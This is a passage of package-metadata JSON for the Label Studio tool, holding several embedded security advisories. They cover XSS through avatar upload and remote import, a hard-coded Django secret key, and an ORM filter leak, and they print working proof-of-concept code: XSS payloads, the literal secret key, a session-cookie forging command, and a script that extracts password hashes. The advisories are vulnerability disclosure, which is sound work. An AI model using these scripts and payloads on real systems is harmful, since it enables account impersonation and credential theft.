not h:\n        raise forms.ValidationError(\"Can't read image, try another one\")\n\n    # validate dimensions\n    max_width = max_height = 1200\n    if w > max_width or h > max_height:\n        raise forms.ValidationError('Please use an image that is %s x %s pixels or smaller.'\n                                    % (max_width, max_height))\n\n    # validate content type\n    main, sub = avatar.content_type.split('/') <2>\n    if not (main == 'image' and sub.lower() in ['jpeg', 'jpg', 'gif', 'png']):\n        raise forms.ValidationError(u'Please use a JPEG, GIF or PNG image.')\n\n    # validate file size\n    max_size = 1024 * 1024\n    if len(avatar) > max_size:\n        raise forms.ValidationError('Avatar file size may not exceed ' + str(max_size/1024) + ' kb')\n\n    return avatar\n```\n1. Attempts to get image dimensions to validate the uploaded avatar file is an image.\n2. Extracts the `Content-Type` from the upload `POST` request. A user can easily bypass this verification by changing the mimetype of the uploaded file to an allowed type (eg. `image/jpeg`).\n3. The file extension of the uploaded file is never validated and is saved to the filesystem.\n\n[Label Studio serves avatar images using Django's built-in `serve` view](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/users/urls.py#L25-L26), which is [not secure for production use according to Django's documentation](https://docs.djangoproject.com/en/4.2/ref/views/#serving-files-in-development).\n\n```python\n    re_path(r'^data/' + settings.AVATAR_PATH + '/(?P<path>.*)$', serve,\n            kwargs={'document_root': join(settings.MEDIA_ROOT, settings.AVATAR_PATH)}),\n```\n\nThe issue with the Django `serve` view is that it determines the `Content-Type` of the response by the file extension in the URL path. Therefore, an attacker can upload an image that contains malicious HTML code and name the file with a `.html` extension to be rendered as a HTML page. The only file extension validation is performed on the client-side, which can be easily bypassed.\n\n# Proof of Concept\n\nBelow are the steps to reproduce this issue and execute JavaScript code in the context of the Label Studio website.\n\n1. Using any JPEG or PNG image, add in the comment field in the metadata the HTML code `<script>alert(document.domain)</script>`. This can be done using the `exiftool` command as shown below that was used to create the following image.\n\n```bash\nexiftool -Comment='<script>alert(document.domain)</script>' penguin.jpg\n```\n\n![xss-penguin](https://user-images.githubusercontent.com/139727151/266989884-c2cd9b4f-f374-416e-a468-acf41f52e088.jpg)\n\n2. On Label Studio, navigate to account & settings page and intercept the upload request of the avatar image using a tool such as Burp Suite. Modify the filename in the request to have a `.html` extension.\n\n3. Right click the image on the avatar profile and copy the URL. Send this to a victim and it will display an alert box with the host name of the Label Studio instance as shown below.\n\n![xss-alert](https://user-images.githubusercontent.com/139727151/266989952-6fb74c6e-9961-447c-a602-5a6f36627ae6.png)\n\n# Impact\n\nExecuting arbitrary JavaScript could result in an attacker performing malicious actions on Label Studio users if they visit the crafted avatar image. For an example, an attacker can craft a JavaScript payload that adds a new Django Super Administrator user if a Django administrator visits the image.\n\n# Remediation Advice\n\n* Validate the file extension on the server side, not in client-side code.\n* Remove the use of Django's `serve` view and implement a secure controller for viewing uploaded avatar images.\n* Consider saving file content in the database rather than on the filesystem to mitigate against other file related vulnerabilities.\n* Avoid trusting user controlled inputs.\n\n# Discovered\n- August 2023, Alex Brown, elttam","fixed_in":["1.9.2"],"id":"GHSA-q68h-xwq5-mm7x","link":"https://osv.dev/vulnerability/GHSA-q68h-xwq5-mm7x","source":"osv","summary":null,"withdrawn":null},{"aliases":["CVE-2024-23633"],"details":"# Introduction\n\nThis write-up describes a vulnerability found in [Label Studio](https://github.com/HumanSignal/label-studio), a popular open source data labeling tool. The vulnerability affects all versions of Label Studio prior to `1.10.1` and was tested on version `1.9.2.post0`.\n\n# Overview\n\n[Label Studio](https://github.com/HumanSignal/label-studio) had a remote import feature allowed users to import data from a remote web source, that was downloaded and could be viewed on the website. This feature could had been abused to download a HTML file that executed malicious JavaScript code in the context of the Label Studio website.\n\n# Description\n\nThe following [code snippet in Label Studio](https://github.com/HumanSignal/label-studio/blob/1.9.2.post0/label_studio/data_import/uploader.py#L125C5-L146) showed that is a URL passed the SSRF verification checks, the contents of the file would be downloaded using the filename in the URL.\n\n```python\ndef tasks_from_url(file_upload_ids, project, user, url, could_be_tasks_list):\n    \"\"\"Download file using URL and read tasks from it\"\"\"\n    # process URL with tasks\n    try:\n        filename = url.rsplit('/', 1)[-1] <1>\n\n        response = ssrf_safe_get(\n            url, verify=project.organization.should_verify_ssl_certs(), stream=True, headers={'Accept-Encoding': None}\n        )\n        file_content = response.content\n        check_tasks_max_file_size(int(response.headers['content-length']))\n        file_upload = create_file_upload(user, project, SimpleUploadedFile(filename, file_content))\n        if file_upload.format_could_be_tasks_list:\n            could_be_tasks_list = True\n        file_upload_ids.append(file_upload.id)\n        tasks, found_formats, data_keys = FileUpload.load_tasks_from_uploaded_files(project, file_upload_ids)\n\n    except ValidationError as e:\n        raise e\n    except Exception as e:\n        raise ValidationError(str(e))\n    return data_keys, found_formats, tasks, file_upload_ids, could_be_tasks_list\n```\n1. The file name that was set was retrieved from the URL.\n\nThe downloaded file path could then be retrieved by sending a request to `/api/projects/{project_id}/file-uploads?ids=[{download_id}]` where `{project_id}` was the ID of the project and `{download_id}` was the ID of the downloaded file. Once the downloaded file path was retrieved by the previous API endpoint, the [following code snippet](https://github.com/HumanSignal/label-studio/blob/1.9.2.post0/label_studio/data_import/api.py#L595C1-L616C62) demonstrated that the `Content-Type` of the response was determined by the file extension, since `mimetypes.guess_type` guesses the `Content-Type` based on the file extension.\n\n```python\nclass UploadedFileResponse(generics.RetrieveAPIView):\n    permission_classes = (IsAuthenticated,)\n\n    @swagger_auto_schema(auto_schema=None)\n    def get(self, *args, **kwargs):\n        request = self.request\n        filename = kwargs['filename']\n        # XXX needed, on windows os.path.join generates '\\' which breaks FileUpload\n        file = settings.UPLOAD_DIR + ('/' if not settings.UPLOAD_DIR.endswith('/') else '') + filename\n        logger.debug(f'Fetch uploaded file by user {request.user} => {file}')\n        file_upload = FileUpload.objects.filter(file=file).last()\n\n        if not file_upload.has_permission(request.user):\n            return Response(status=status.HTTP_403_FORBIDDEN)\n\n        file = file_upload.file\n        if file.storage.exists(file.name):\n            content_type, encoding = mimetypes.guess_type(str(file.name)) <1>\n            content_type = content_type or 'application/octet-stream'\n            return RangedFileResponse(request, file.open(mode='rb'), content_type=content_type)\n        else:\n            return Response(status=status.HTTP_404_NOT_FOUND)\n```\n1. Determines the `Content-Type` based on the extension of the uploaded file by using `mimetypes.guess_type`.\n\nSince the `Content-Type` was determined by the file extension of the downloaded file, an attacker could import in a `.html` file that would execute JavaScript when visited.\n\n# Proof of Concept\n\nBelow were the steps to recreate this issue:\n\n1. Host the following HTML proof of concept (POC) script on an external website with the file extension `.html` that would be downloaded to the Label Studio website.\n\n```html\n<html>\n    <body>\n        <h1>Data Import XSS</h1>\n        <script>\n            alert(document.domain);\n        </script>\n    </body>\n</html>\n```\n\n2. Send the following `POST` request to download the HTML POC to the Label Studio and note the returned ID of the downloaded file in the response. In the following POC the `{victim_host}` is the address and port of the victim Label Studio website (eg. `labelstudio.com:8080`), `{project_id}` is the ID of the project where the data would be imported into, `{cookies}` are session cookies and `{evil_site}` is the website hosting the malicious HTML file (named `xss.html` in the following example).\n\n```http\nPOST /api/projects/{project_id}/import?commit_to_project=false HTTP/1.1\nHost: {victim_host}\nAccept: */*\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate\ncontent-type: application/x-www-form-urlencoded\nContent-Length: 43\nConnection: close\nCookie: {cookies}\nPragma: no-cache\nCache-Control: no-cache\n\nurl=https://{evil_site}/xss.html\n```\n\n3. To retrieve the downloaded file path could be retrieved by sending a `GET` request to `/api/projects/{project_id}/file-uploads?ids=[{download_id}]`, where `{download_id}` is the ID of the file download from the previous step.\n\n4. Send your victim a link to `/data/{file_path}`, where `{file_path}` is the path of the downloaded file from the previous step. The following screenshot demonstrated executing the POC JavaScript code by visiting `/data/upload/1/cfcfc340-xss.html`.\n\n![xss-import-alert](https://user-images.githubusercontent.com/139727151/282223222-d8f9132c-838e-4aa6-9c03-a2bc83b4a409.png)\n\n# Impact\n\nExecuting arbitrary JavaScript could result in an attacker performing malicious actions on Label Studio users if they visit the crafted avatar image. For an example, an attacker can craft a JavaScript payload that adds a new Django Super Administrator user if a Django administrator visits the image.\n\n# Remediation Advice\n\n* For all user provided files that are downloaded by Label Studio, set the `Content-Security-Policy: sandbox;` response header when viewed on the site. The `sandbox` directive restricts a page's actions to prevent popups, execution of plugins and scripts and enforces a `same-origin` policy ([documentation](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/sandbox)).\n* Restrict the allowed file extensions that could be downloaded.\n\n# Discovered\n- August 2023, Alex Brown, elttam","fixed_in":["1.10.1"],"id":"GHSA-fq23-g58m-799r","link":"https://osv.dev/vulnerability/GHSA-fq23-g58m-799r","source":"osv","summary":null,"withdrawn":null},{"aliases":["CVE-2023-43791"],"details":"# Introduction\n\nThis write-up describes a vulnerability found in [Label Studio](https://github.com/HumanSignal/label-studio), a popular open source data labeling tool. The vulnerability was found to affect versions before `1.8.2`, where a patch was introduced.\n\n# Overview\n\nIn [Label Studio version 1.8.1](https://github.com/HumanSignal/label-studio/tree/1.8.1), a hard coded Django `SECRET_KEY` was set in the application settings. The Django `SECRET_KEY` is used for signing session tokens by the web application framework, and should never be shared with unauthorised parties.\n\nHowever, the Django framework inserts a `_auth_user_hash` claim in the session token that is a HMAC hash of the account's password hash. That claim would normally prevent forging a valid Django session token without knowing the password hash of the account. However, any authenticated user can exploit an Object Relational Mapper (ORM) Leak vulnerability in Label Studio to leak the password hash of any account on the platform, which is reported as a separate vulnerability. An attacker can exploit the ORM Leak vulnerability (which was patched in [`1.9.2post0`](https://github.com/HumanSignal/label-studio/releases/tag/1.9.2.post0)) and forge session tokens for all users on Label Studio using the hard coded `SECRET_KEY`.\n\n# Description\n\nBelow is the code snippet of the Django settings file at [`label_studio/core/settings/base.py`](https://github.com/HumanSignal/label-studio/blob/1.8.1/label_studio/core/settings/base.py#L108).\n\n```python\n# SECURITY WARNING: keep the secret key used in production secret!\nSECRET_KEY = '$(fefwefwef13;LFK{P!)@#*!)kdsjfWF2l+i5e3t(8a1n'\n```\n\nThis secret is hard coded across all instances of Label Studio.\n\n# Proof of Concept\n\nBelow are the steps that an attacker could do to forge a session token of any account on Label Studio:\n\n1. Exploit the ORM Leak vulnerability (patched in [`1.9.2post0`](https://github.com/HumanSignal/label-studio/releases/tag/1.9.2.post0)) in Label Studio to retrieve the full password hash that will be impersonated. For this example, a session token will be forged for an account with the email `ghostccamm@testvm.local` with the password hash `pbkdf2_sha256$260000$KKeew1othBwMKk2QudmEgb$ALiopdBpWMwMDD628xeE1Ie7YSsKxdXdvWfo/PvVXvw=` that was retrieved.\n\n2. Create a new Django project with an empty application. In `cookieforge/cookieforge/settings.py` set the `SECRET_KEY` to `$(fefwefwef13;LFK{P!)@#*!)kdsjfWF2l+i5e3t(8a1n`. Create a management command with the following code that will be used to create forged session tokens.\n\n```python\nfrom typing import Any\nfrom django.core.management.base import  BaseCommand, CommandParser\nfrom django.core import signing\nfrom django.utils.crypto import salted_hmac\nfrom django.conf import settings\nimport time, uuid\n\nclass Command(BaseCommand):\n    help = \"Forge a users session cookie on Label Studio\"\n\n    def add_arguments(self, parser: CommandParser) -> None:\n        parser.add_argument(\n            '-o', '--organisation',\n            help='Organisation ID to access',\n            default=1,\n            type=int\n        )\n\n        parser.add_argument(\n            'user_id',\n            help='The User ID of the victim you want to impersonate',\n            type=str\n        )\n\n        parser.add_argument(\n            'user_hash',\n            help='The password hash the user you want to impersonate'\n        )\n\n    def handle(self, *args: Any, **options: Any) -> str | None:\n        key = settings.SECRET_KEY\n        # Creates the _auth_user_hash HMAC of the victim's password hash\n        auth_user_hash = salted_hmac(\n            'django.contrib.auth.models.AbstractBaseUser.get_session_auth_hash',\n            options['user_hash'],\n            secret=key,\n            algorithm=\"sha256\"\n        ).hexdigest()\n\n        session_dict = {\n            'uid': str(uuid.uuid4()), \n            'organization_pk': options['organisation'], \n            'next_page': '/projects/', \n            'last_login': time.time(), \n            '_auth_user_id': options['user_id'], \n            '_auth_user_backend': \n            'django.contrib.auth.backends.ModelBackend', \n            '_auth_user_hash': auth_user_hash, \n            'keep_me_logged_in': True, \n            '_session_expiry': 600\n        }\n\n        # Creates a forged session token\n        session_token = signing.dumps(\n            session_dict,\n            key=key,\n            salt=\"django.contrib.sessions.backends.signed_cookies\",\n            compress=True\n        )\n\n        self.stdout.write(\n            self.style.SUCCESS(f\"session token: {session_token}\")\n        )\n```\n\n3. Next run the following command replacing the `{user_id}` with the user ID of the account you want to the impersonate and `{user_hash}` with the victim's password hash. Copy the session token that is printed.\n\n```python\npython3 manage.py forgecookie {user_id} '{user_hash}'\n```\n\n4. Change the `sessionid` cookie on the browser and refresh the page. Observe being authenticated as the victim user.\n\n# Impact\n\nThis vulnerability can be chained with the ORM Leak vulnerability (which was patched in [`1.9.2post0`](https://github.com/HumanSignal/label-studio/releases/tag/1.9.2.post0)) in Label Studio to impersonate any account on Label Studio. An attacker could exploit these vulnerabilities to escalate their privileges from a low privilege user to a Django Super Administrator user.\n\n# Remediation Advice\n\nIt is important to note that the hard coded `SECRET_KEY` has already been removed in Label Studio versions `>=1.8.2`. However, there has not been any public disclosure about the use of the hard coded secret key and users have not been informed about the security vulnerability.\n\nWe recommend that Human Signal to release a public disclosure about the hard coded `SECRET_KEY` to encourage users to patch to a version `>=1.8.2` to mitigate the likelihood of an attacker exploiting these vulnerabilities to impersonate all accounts on the platform.\n\n# Discovered\n- August 2023, Robert Schuh, @robbilie\n- August 2023, Alex Brown, elttam","fixed_in":["1.8.2"],"id":"GHSA-f475-x83m-rx5m","link":"https://osv.dev/vulnerability/GHSA-f475-x83m-rx5m","source":"osv","summary":null,"withdrawn":null},{"aliases":["CVE-2023-47117"],"details":"# Introduction\n\nThis write-up describes a vulnerability found in [Label Studio](https://github.com/HumanSignal/label-studio), a popular open source data labeling tool. The vulnerability affects all versions of Label Studio prior to `1.9.2post0` and was tested on version `1.8.2`.\n\n# Overview\n\nIn all current versions of [Label Studio](https://github.com/HumanSignal/label-studio), the application allows users to insecurely set filters for filtering tasks. An attacker can construct a *filter chain* to filter tasks based on sensitive fields for all user accounts on the platform by exploiting Django's Object Relational Mapper (ORM). Since the results of query can be manipulated by the ORM filter, an attacker can leak these sensitive fields character by character. For an example, the following filter chain will task results by the password hash of an account on Label Studio.\n\n```\nfilter:tasks:updated_by__active_organization__active_users__password\n```\n\nFor consistency, this type of vulnerability will be termed as **ORM Leak** in the rest of this disclosure. \n\nIn addition, Label Studio had a hard coded secret key that an attacker can use to forge a session token of any user by exploiting this ORM Leak vulnerability to leak account password hashes.\n\n# Description\n\nThe following code snippet from the `ViewSetSerializer` in [`label_studio/data_manager/serializers.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/data_manager/serializers.py#L115) insecurely creates `Filter` objects from a JSON `POST` request to the `/api/dm/views/{viewId}` API endpoint.\n\n```python\n    @staticmethod\n    def _create_filters(filter_group, filters_data):\n        filter_index = 0\n        for filter_data in filters_data:\n            filter_data[\"index\"] = filter_index\n            filter_group.filters.add(Filter.objects.create(**filter_data))\n            filter_index += 1\n```\n\nThese `Filter` objects are then applied in the `TaskQuerySet` in [`label_studio/data_manager/managers.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/data_manager/managers.py#L473).\n\n```python\nclass TaskQuerySet(models.QuerySet):\n    def prepared(self, prepare_params=None):\n        \"\"\" Apply filters, ordering and selected items to queryset\n\n        :param prepare_params: prepare params with project, filters, orderings, etc\n        :return: ordered and filtered queryset\n        \"\"\"\n        from projects.models import Project\n\n        queryset = self\n\n        if prepare_params is None:\n            return queryset\n\n        project = Project.objects.get(pk=prepare_params.project)\n        request = prepare_params.request\n        queryset = apply_filters(queryset, prepare_params.filters, project, request) <1>\n        queryset = apply_ordering(queryset, prepare_params.ordering, project, request, view_data=prepare_params.data)\n\n        if not prepare_params.selectedItems:\n            return queryset\n\n        # included selected items\n        if prepare_params.selectedItems.all is False and prepare_params.selectedItems.included:\n            queryset = queryset.filter(id__in=prepare_params.selectedItems.included)\n\n        # excluded selected items\n        elif prepare_params.selectedItems.all is True and prepare_params.selectedItems.excluded:\n            queryset = queryset.exclude(id__in=prepare_params.selectedItems.excluded)\n\n        return queryset\n```\n1. User provided filters are insecurely applied here by calling the `apply_filters` that constructs the Django ORM filter.\n\nThe `PreparedTaskManager` in [`label_studio/data_manager/managers.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/data_manager/managers.py#L655) uses the vulnerable `TaskQuerySet` for building the Django queryset for querying `Task` objects, as shown in the following code snippet.\n\n```python\nclass PreparedTaskManager(models.Manager):\n    #...\n\n    def get_queryset(self, fields_for_evaluation=None, prepare_params=None, all_fields=False): <1>\n        \"\"\"\n        :param fields_for_evaluation: list of annotated fields in task\n        :param prepare_params: filters, ordering, selected items\n        :param all_fields: evaluate all fields for task\n        :param request: request for user extraction\n        :return: task queryset with annotated fields\n        \"\"\"\n        queryset = self.only_filtered(prepare_params=prepare_params)\n        return self.annotate_queryset(\n            queryset,\n            fields_for_evaluation=fields_for_evaluation,\n            all_fields=all_fields,\n            request=prepare_params.request\n        )\n\n    def only_filtered(self, prepare_params=None):\n        request = prepare_params.request\n        queryset = TaskQuerySet(self.model).filter(project=prepare_params.project) <1>\n        fields_for_filter_ordering = get_fields_for_filter_ordering(prepare_params)\n        queryset = self.annotate_queryset(queryset, fields_for_evaluation=fields_for_filter_ordering, request=request)\n        return queryset.prepared(prepare_params=prepare_params)\n```\n1. Special Django method for the `models.Manager` class that is used to retrieve the queryset for querying objects of a model.\n2. Uses the vulnerable `TaskQuerySet` that was explained above.\n\nThe following code snippet of the `Task` model in [`label_studio/tasks/models.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/tasks/models.py#L49C1-L102C102) shows that the vulnerable `PreparedTaskManager` is set as a class variable, along with the `updated_by` relational mapping to a Django user that will be exploited as the entrypoint of the filter chain.\n\n```python\n# ...\nclass Task(TaskMixin, models.Model):\n    \"\"\" Business tasks from project\n    \"\"\"\n    id = models.AutoField(auto_created=True, primary_key=True, serialize=False, verbose_name='ID', db_index=True)\n\n    # ...\n\n    updated_by = models.ForeignKey(settings.AUTH_USER_MODEL, related_name='updated_tasks',\n        on_delete=models.SET_NULL, null=True, verbose_name=_('updated by'),\n        help_text='Last annotator or reviewer who updated this task') <1>\n\n    # ...\n\n    objects = TaskManager()  # task manager by default\n    prepared = PreparedTaskManager()  # task manager with filters, ordering, etc for data_manager app <2>\n\n    # ...\n```\n1. The entry point of the filter chain to filter by the `updated_by__active_organization__active_users__password`.\n2. The vulnerable `PreparedTaskManager` being set that will be exploited.\n\nFinally, the `TaskListAPI` view set in [`label_studio/tasks/api.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/tasks/api.py#L205) with the `/api/tasks` API endpoint uses the vulnerable `PreparedTaskManager` to filter `Task` objects.\n\n```python\n    def get_queryset(self):\n        task_id = self.request.parser_context['kwargs'].get('pk')\n        task = generics.get_object_or_404(Task, pk=task_id)\n        review = bool_from_request(self.request.GET, 'review', False)\n        selected = {\"all\": False, \"included\": [self.kwargs.get(\"pk\")]}\n        if review:\n            kwargs = {\n                'fields_for_evaluation': ['annotators', 'reviewed']\n            }\n        else:\n            kwargs = {'all_fields': True}\n        project = self.request.query_params.get('project') or self.request.data.get('project')\n        if not project:\n            project = task.project.id\n        return self.prefetch(\n            Task.prepared.get_queryset(\n                prepare_params=PrepareParams(project=project, selectedItems=selected, request=self.request),\n                **kwargs\n            )) <1>\n```\n1. Uses the vulnerable `PreparedTaskManager` to filter objects.\n\n# Proof of Concept\n\nBelow are the steps to exploit about how to exploit this vulnerability to leak the password hash of an account on Label Studio.\n\n1. Create two accounts on Label Studio and choose one account to be the victim and the other the hacker account that you will use.\n2. Create a new project or use an existing project, then add a task to the project. Update the task with the hacker account to cause the entry point of the filter chain.\n3. Navigate to the task view for the project and add any filter with the `Network` inspect tab open on the browser. Look for a `PATCH` request to `/api/dm/views/{view_id}?interaction=filter&project={project_id}` and save the `view_id` and `project_id` for the next step.\n4. Download the attached proof of concept exploit script named `labelstudio_ormleak.py`. This script will leak the password hash of the victim account character by character. Run the following command to run the exploit script, replacing the `{view_id}`, `{project_id}`, `{cookie_str}` and `{url}` with the corresponding values. For further explanation run `python3 labelstudio_ormleak.py --help`.\n\n```bash\npython3 labelstudio_ormleak.py -v {view_id} -p {project_id} -c '{cookie_str}' -u '{url}'\n```\n\nThe following example GIF demonstrates exploiting this ORM Leak vulnerability to retrieve the password hash `pbkdf2_sha256$260000$KKeew1othBwMKk2QudmEgb$ALiopdBpWMwMDD628xeE1Ie7YSsKxdXdvWfo/PvVXvw=`.\n\n![labelstudio_ormleak_poc](https://user-images.githubusercontent.com/139727151/266986646-a3d1367c-fb4d-4482-9b6a-18a5d7316385.gif)\n\n# Impact\n\nThis vulnerability can be exploited to completely compromise the confidentiality of highly sensitive account information, such as account password hashes. For all versions `<=1.8.1`, this finding can also be chained with hard coded `SECRET_KEY` to forge session tokens of any user on Label Studio and could be abuse to deteriorate the integrity and availability.\n\n# Remediation Advice\n\n* Do not use unsanitised values for constructing a filter for querying objects using Django's ORM. Django's ORM allows querying by relation field and performs auto lookups, that enable filtering by sensitive fields.\n* Validate filter values to an allow list before performing any queries.\n\n# Discovered\n- August 2023, Alex Brown, elttam\n\n---\n# `labelstudio_ormleak.py` proof of concept\n\n```py\nimport argparse\nimport re\nimport requests\nimport string\nimport sys\n\n# Password hash characters\nCHARS = string.ascii_letters + string.digits + '$/+=_!'\nCHARS_LEN = len(CHARS)\n\nPAYLOAD = {\n    \"data\": {\n        \"columnsDisplayType\": {},\n        \"columnsWidth\": {},\n        \"filters\": {\n            \"conjunction\": \"and\",\n            \"items\": [\n                {\n                    \"filter\": \"filter:tasks:updated_by__active_organization__active_users__password\", # ORM Leak filter chain\n                    \"operator\": \"regex\", # Use regex operator to filter password hash value\n                    \"type\": \"String\",\n                    \"value\": \"REPLACEME\"\n                }\n            ]\n        },\n        \"gridWidth\": 4,\n        \"hiddenColumns\":{\"explore\":[\"tasks:inner_id\"],\"labeling\":[\"tasks:id\",\"tasks:inner_id\"]},\n        \"ordering\": [],\n        \"search_text\": None,\n        \"target\": \"tasks\",\n        \"title\": \"Default\",\n        \"type\": \"list\"\n    },\n    \"id\": 1, # View ID\n    \"project\": \"1\" # Project ID\n}\n\ndef parse_args() -> argparse.Namespace:\n    parser = argparse.ArgumentParser(\n        description='Leak an accounts password hash by exploiting a ORM Leak vulnerability in Label Studio'\n    )\n\n    parser.add_argument(\n        '-v', '--view-id',\n        help='View id of the page',\n        type=int,\n        required=True\n    )\n\n    parser.add_argument(\n        '-p', '--project-id',\n        help='Project id to filter tasks for',\n        type=int,\n        required=True\n    )\n\n    parser.add_argument(\n        '-c', '--cookie-str',\n        help='Cookie string for authentication',\n        required=True\n    )\n\n    parser.add_argument(\n        '-u', '--url',\n        help='Base URL to Label Studio instance',\n        required=True\n    )\n\n    return parser.parse_args()\n\ndef setup() -> dict:\n    args = parse_args()\n    view_id = args.view_id\n    project_id = args.project_id\n    path_1 = \"/api/dm/views/{view_id}?interaction=filter&project={project_id}\".format(\n        view_id=view_id,\n        project_id=project_id\n    )\n    path_2 = \"/api/tasks?page=1&page_size=1&view={view_id}&interaction=filter&project={project_id}\".format(\n        view_id=view_id,\n        project_id=project_id\n    )\n    PAYLOAD[\"id\"] = view_id\n    PAYLOAD[\"project\"] = str(project_id)\n    \n    config_dict = {\n        'COOKIE_STR': args.cookie_str,\n        'URL_PATH_1': args.url + path_1,\n        'URL_PATH_2': args.url + path_2,\n        'PAYLOAD': PAYLOAD\n    }\n    return config_dict\n\ndef test_payload(config_dict: dict, payload) -> bool:\n    sys.stdout.flush()\n    cookie_str = config_dict[\"COOKIE_STR\"]\n    r_set = requests.patch(\n        config_dict[\"URL_PATH_1\"],\n        json=payload,\n        headers={\n            \"Cookie\": cookie_str\n        }\n    )\n\n    r_listen = requests.get(\n        config_dict['URL_PATH_2'],\n        headers={\n            \"Cookie\": cookie_str\n        }\n    )\n\n    r_json = r_listen.json()\n    return len(r_json[\"tasks\"]) >= 1\n\ndef test_char(config_dict, known_hash, c):\n    json_payload_suffix = PAYLOAD\n    test_escaped = re.escape(known_hash + c)\n    json_payload_suffix[\"data\"][\"filters\"][\"items\"][0][\"value\"] =  f\"^{test_escaped}\"\n\n    suffix_result = test_payload(config_dict, json_payload_suffix)\n    if suffix_result:\n        return (known_hash + c, c)\n    \n    return None\n\ndef main():\n    config_dict = setup()\n    # By default Label Studio password hashes start with these characters\n    known_hash = \"pbkdf2_sha256$260000$\"\n    print()\n    print(f\"dumped: {known_hash}\", end=\"\")\n    sys.stdout.flush()\n\n    while True:\n        found = False\n\n        for c in CHARS:\n            r = test_char(config_dict, known_hash, c)\n            if not r is None:\n                new_hash, c = r\n                known_hash = new_hash\n                print(c, end=\"\")\n                sys.stdout.flush()\n                found = True\n                break\n\n        if not found:\n            break\n\n    print()\n\nif __name__ == \"__main__\":\n    main()\n```","fixed_in":["1.9.2.post0"],"id":"GHSA-6hjj-gq77-j4qw","link":"https://osv.dev/vulnerability/GHSA-6hjj-gq77-j4qw","source":"osv","summary":null,"withdrawn":null},{"aliases":["CVE-2024-26152"],"details":"### Summary\nOn all Label Studio versions prior to 1.11.0, data imported via file upload feature is not properly sanitized prior to being rendered within a [`Choices`](https://labelstud.io/tags/choices) or [`Labels`](https://labelstud.io/tags/labels) tag, resulting in an XSS vulnerability.\n\n### Details\nNeed permission to use the \"data import\" function. This was reproduced on Label Studio 1.10.1.\n\n### PoC\n\n1. Create a project.\n![Create a project](https://github.com/HumanSignal/label-studio/assets/3943358/9b1536ad-feac-4238-a1bd-ca9b1b798673)\n\n2. Upload a file containing the payload using the \"Upload Files\" function.\n![2  Upload a file containing the payload using the Upload Files function](https://github.com/HumanSignal/label-studio/assets/3943358/26bb7af1-1cd2-408f-9adf-61e31a5b7328)\n![3  complete](https://github.com/HumanSignal/label-studio/assets/3943358/f2f62774-1fa6-4456-9e6f-8fa1ca0a2d2e)\n\nThe following are the contents of the files used in the PoC\n```\n{\n  \"data\": {\n    \"prompt\": \"labelstudio universe image\",\n    \"images\": [\n      {\n        \"value\": \"id123#0\",\n        \"style\": \"margin: 5px\",\n        \"html\": \"<img width='400' src='https://labelstud.io/_astro/images-tab.64279c16_ZaBSvC.avif' onload=alert(document.cookie)>\"\n      }\n    ]\n  }\n}\n```\n\n3. Select the text-to-image generation labeling template of Ranking and scoring\n![3  Select the text-to-image generation labelling template for Ranking and scoring](https://github.com/HumanSignal/label-studio/assets/3943358/f227f49c-a718-4738-bc2a-807da4f97155)\n![5  save](https://github.com/HumanSignal/label-studio/assets/3943358/9b529f8a-8e99-4bb0-bdf6-bb7a95c9b75d)\n\n4. Select a task\n![4  Select a task](https://github.com/HumanSignal/label-studio/assets/3943358/71856b7a-2b1f-44ea-99ab-fc48bc20caa7)\n\n5. Check that the script is running\n![5  Check that the script is running](https://github.com/HumanSignal/label-studio/assets/3943358/e396ae7b-a591-4db7-afe9-5bab30b48cb9)\n\n### Impact\nMalicious scripts can be injected into the code, and when linked with vulnerabilities such as CSRF, it can cause even greater damage. In particular, It can become a source of further attacks, especially when linked to social engineering.\n","fixed_in":["1.11.0"],"id":"GHSA-6xv9-957j-qfhg","link":"https://osv.dev/vulnerability/GHSA-6xv9-957j-qfhg","source":"osv","summary":null,"withdrawn":null}]},"1.3":{"info":{"author":"Heartex","author_email":"hello@heartex.ai","bugtrack_url":null,"classifiers":["License :: OSI Approved :: Apache Software License","Operating System :: OS Independent","Programming Language :: Python :: 3"],"description_content_type":"text/markdown","docs_url":null,"download_url":"","downloads":{"last_day":-1,"last_month":-1,"last_week":-1},"dynamic":null,"home_page":"https://github.com/heartexlabs/label-studio","keywords":"","license":"","maintainer":"","maintainer_email":"","name":"label-studio","package_url":"https://pypi.org/project/label-studio/","platform":"","project_url":"https://pypi.org/project/label-studio/","project_urls":{"Homepage":"https://github.com/heartexlabs/label-studio"},"provides_extra":null,"release_url":"https://pypi.org/project/label-studio/1.3/","requires_dist":["wheel","appdirs (>=1.4.3)","attr (==0.3.1)","attrs (>=19.2.0)","pyyaml (>=5.3.1)","azure-storage-blob (>=12.6.0)","boto (==2.49.0)","boto3 (==1.16.28)","botocore (==1.19.28)","google-cloud-storage (==1.28.1)","google-cloud-logging (==2.6.0)","Django (==3.1.13)","django-annoying (==0.10.6)","django-debug-toolbar (==3.2.1)","django-filter (==2.4.0)","django-model-utils (==4.1.1)","django-rq (==2.3.2)","django-cors-headers (==3.6.0)","django-extensions (==3.1.0)","django-rest-swagger (==2.2.0)","django-user-agents (==0.4.0)","django-ranged-fileresponse (>=0.1.2)","django-redis-cache (==3.0.0)","drf-dynamic-fields (==0.3.0)","drf-yasg (==1.20.0)","drf-generators (==0.3.0)","htmlmin (==0.1.12)","jsonschema (==3.2.0)","lockfile (>=0.12.0)","lxml (>=4.2.5)","numpy (>=1.19.1)","ordered-set (==4.0.2)","pandas (>=0.24.0)","protobuf (>=3.15.5)","psycopg2-binary (==2.8.4)","pydantic (==1.7.3)","python-dateutil (==2.8.1)","pytz (==2019.3)","requests (<3,>=2.22.0)","rq (==1.7.0)","rules (==2.2)","ujson (>=3.0.0)","xmljson (==0.2.0)","colorama (>=0.4.4)","boxing (>=0.1.4)","redis (>=3.5.0)","sentry-sdk (>=1.1.0)","label-studio-converter (==0.0.32)","mysqlclient ; extra == 'mysql'"],"requires_python":">=3.6","summary":"Label Studio annotation 